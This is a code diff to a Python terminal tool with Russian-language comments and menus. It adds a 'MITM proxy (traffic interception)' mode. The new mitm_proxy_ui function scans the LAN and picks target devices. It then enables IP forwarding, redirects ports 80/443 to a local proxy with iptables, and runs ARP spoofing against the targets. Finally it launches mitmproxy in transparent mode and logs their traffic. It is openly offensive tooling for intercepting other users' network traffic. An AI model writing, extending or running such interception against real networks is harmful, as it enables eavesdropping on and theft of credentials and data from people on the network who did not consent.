@@ -88,9 +88,10 @@ while True:
         import curses
         import curses.textpad
         import time
-        from arp_spoof import arp_spoof_attack, restore_arp
+        from arp_spoof import arp_spoof_attack, restore_arp, start_arp_spoof_thread, stop_arp_spoof_thread, is_arp_spoofing
         from network_scanner import scan_network, detect_default_gateway
         from dependency_manager import install_dependencies, enable_ip_forwarding, disable_ip_forwarding, setup_iptables, clear_iptables
+        import proxy_server
         break
     except:
         from dependency_manager import install_dependencies, enable_ip_forwarding, disable_ip_forwarding, \
@@ -186,7 +187,7 @@ def main_menu(stdscr):
     curses.init_pair(7, curses.COLOR_BLACK, curses.COLOR_WHITE)   # Цвет строки состояния
 
     current_row = 0  # Изначально выделена первая строка
-    menu = ["Сканировать сеть", "Запустить ARP Spoofing", "Восстановить таблицы ARP", "Установить зависимости", "Выход"]  # Пункты меню
+    menu = ["Сканировать сеть", "Запустить ARP Spoofing", "Восстановить таблицы ARP", "MITM-прокси (перехват трафика)", "Установить зависимости", "Выход"]  # Пункты меню
 
     while True:
         draw_logo_and_menu(stdscr, current_row, menu)  # Рисуем логотип и меню
@@ -205,9 +206,11 @@ def main_menu(stdscr):
                 arp_spoofing_ui(stdscr)
             elif current_row == 2:  # Если выбран пункт "Восстановить таблицы ARP"
                 restore_arp_ui(stdscr)
-            elif current_row == 3:  # Если выбран пункт "Установить зависимости"
+            elif current_row == 3:  # Если выбран пункт "MITM-прокси"
+                mitm_proxy_ui(stdscr)
+            elif current_row == 4:  # Если выбран пункт "Установить зависимости"
                 install_dependencies_ui(stdscr)
-            elif current_row == 4:  # Если выбран пункт "Выход"
+            elif current_row == 5:  # Если выбран пункт "Выход"
                 break  # Выходим из цикла и завершаем программу
 
 def scan_network_ui(stdscr):
@@ -422,6 +425,143 @@ def install_dependencies_ui(stdscr):
     stdscr.addstr(6, 2, "Зависимости установлены. Нажмите любую клавишу, чтобы вернуться в меню...", curses.color_pair(3))  # Сообщение о завершении
     stdscr.refresh()  # Обновляем экран
     stdscr.getch()  # Ожидаем нажатия клавиши для возврата
+
+def mitm_proxy_ui(stdscr):
+    """
+    Экран управления MITM-прокси.
+
+    Позволяет:
+      1. Выбрать целевые устройства.
+      2. Включить IP-форвардинг + iptables-редирект (80/443 → 8080).
+      3. Запустить ARP-спуфинг в фоне.
+      4. Запустить mitmproxy (mitmdump) в прозрачном режиме.
+      5. Остановить всё и восстановить сеть.
+    """
+
+    _targets = []   # список IP выбранных целей
+    _gateway = None
+
+    def _draw_status():
+        stdscr.clear()
+        for i, line in enumerate(logo_art):
+            safe_addstr(stdscr, i, 0, line, curses.color_pair(1))
+
+        safe_addstr(stdscr, 12, 2, "=== MITM-прокси (перехват трафика) ===", curses.A_BOLD | curses.color_pair(2))
+
+        arp_status  = "✔ активен" if is_arp_spoofing()          else "✘ остановлен"
+        prx_status  = "✔ активен" if proxy_server.is_running()  else "✘ остановлен"
+        arp_color   = curses.color_pair(4) if is_arp_spoofing()         else curses.color_pair(3)
+        prx_color   = curses.color_pair(4) if proxy_server.is_running() else curses.color_pair(3)
+
+        safe_addstr(stdscr, 14, 2, f"ARP-спуфинг : {arp_status}", arp_color)
+        safe_addstr(stdscr, 15, 2, f"mitmproxy   : {prx_status}", prx_color)
+
+        if proxy_server.is_running():
+            safe_addstr(stdscr, 16, 2,
+                        f"Лог трафика : {proxy_server.get_log_file()}",
+                        curses.color_pair(3))
+            safe_addstr(stdscr, 17, 2,
+                        f"Порт прокси : {proxy_server.get_port()}",
+                        curses.color_pair(3))
+
+        tgt_line = ", ".join(_targets) if _targets else "(не выбраны)"
+        gw_line  = _gateway if _gateway else "(не определён)"
+        safe_addstr(stdscr, 19, 2, f"Цели    : {tgt_line}",  curses.color_pair(3))
+        safe_addstr(stdscr, 20, 2, f"Шлюз    : {gw_line}",   curses.color_pair(3))
+
+        actions = []
+        if not is_arp_spoofing() and not proxy_server.is_running():
+            actions.append("[S] Выбрать цели и запустить MITM")
+        else:
+            actions.append("[X] Остановить MITM и восстановить сеть")
+        actions.append("[Q] Вернуться в меню")
+
+        y = 22
+        for act in actions:
+            safe_addstr(stdscr, y, 2, act, curses.color_pair(5))
+            y += 1
+
+        draw_status_bar(stdscr, "MITM-режим | S — старт | X — стоп | Q — выход")
+        stdscr.refresh()
+
+    def _start_mitm():
+        nonlocal _targets, _gateway
+
+        # 1. Сканируем и выбираем цели
+        safe_addstr(stdscr, 24, 2, "Сканирование сети...", curses.color_pair(3))
+        stdscr.refresh()
+        devices = scan_network()
+        selected = select_devices_ui(stdscr, devices)
+        if not selected:
+            return
+
+        _targets = [d.get("ip") if isinstance(d, dict) else str(d) for d in selected if d]
+        _gateway = get_gateway_for_target(_targets[0]) if _targets else None
+
+        if not _gateway:
+            _gateway = detect_default_gateway()
+
+        if not _targets or not _gateway:
+            _draw_status()
+            safe_addstr(stdscr, 24, 2,
+                        "Ошибка: не удалось определить цели или шлюз. Нажмите любую клавишу.",
+                        curses.color_pair(3))
+            stdscr.refresh()
+            stdscr.getch()
+            return
+
+        # 2. Включаем IP-форвардинг
+        enable_ip_forwarding()
+
+        # 3. Настраиваем iptables-редирект
+        setup_iptables()
+
+        # 4. Запускаем ARP-спуфинг в фоне
+        start_arp_spoof_thread(_targets, _gateway)
+
+        # 5. Запускаем mitmproxy
+        ok = proxy_server.start_mitmproxy()
+        _draw_status()
+        if not ok:
+            safe_addstr(stdscr, 24, 2,
+                        "Не удалось запустить mitmproxy. Проверьте, установлен ли пакет. Нажмите любую клавишу.",
+                        curses.color_pair(3))
+            stdscr.refresh()
+            stdscr.getch()
+
+    def _stop_mitm():
+        # Останавливаем mitmproxy
+        proxy_server.stop_mitmproxy()
+
+        # Останавливаем ARP-спуфинг
+        stop_arp_spoof_thread()
+
+        # Восстанавливаем ARP-таблицы
+        if _targets and _gateway:
+            for t in _targets:
+                try:
+                    restore_arp(t, _gateway)
+                except Exception:
+                    pass
+
+        # Убираем iptables-правила
+        clear_iptables()
+
+        # Отключаем IP-форвардинг
+        disable_ip_forwarding()
+
+    while True:
+        _draw_status()
+        key = stdscr.getch()
+        if key in [ord('q'), ord('Q')]:
+            break
+        elif key in [ord('s'), ord('S')]:
+            if not is_arp_spoofing() and not proxy_server.is_running():
+                _start_mitm()
+        elif key in [ord('x'), ord('X')]:
+            if is_arp_spoofing() or proxy_server.is_running():
+                _stop_mitm()
+
 
 if __name__ == '__main__':
     curses.wrapper(main_menu)  # Инициализируем программу с оберткой curses
